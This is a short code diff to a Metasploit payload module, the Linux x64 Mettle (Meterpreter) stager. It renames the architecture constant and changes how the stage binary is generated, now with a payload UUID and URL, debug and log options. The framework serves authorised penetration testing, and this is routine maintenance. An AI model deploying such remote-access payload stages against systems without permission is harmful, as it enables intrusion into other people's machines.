@@ -21,7 +21,7 @@ module MetasploitModule
           'Brent Cook <bcook[at]rapid7.com>'
         ],
         'Platform'      => 'Linux',
-        'Arch'          => ARCH_X86_64,
+        'Arch'          => ARCH_X64,
         'License'       => MSF_LICENSE,
         'Session'       => Msf::Sessions::Meterpreter_x64_Mettle_Linux
       )
@@ -87,7 +87,9 @@ module MetasploitModule
     conn.put(midstager) == midstager.length
   end
 
-  def generate_stage(_opts = {})
-    MetasploitPayloads::Mettle.read('x86_64-linux-musl', 'mettle.bin')
+  def generate_stage(opts = {})
+    opts[:uuid] ||= generate_payload_uuid
+    MetasploitPayloads::Mettle.new('x86_64-linux-musl', opts.slice(:uuid, :url, :debug, :log_file)).
+      to_binary :process_image
   end
 end
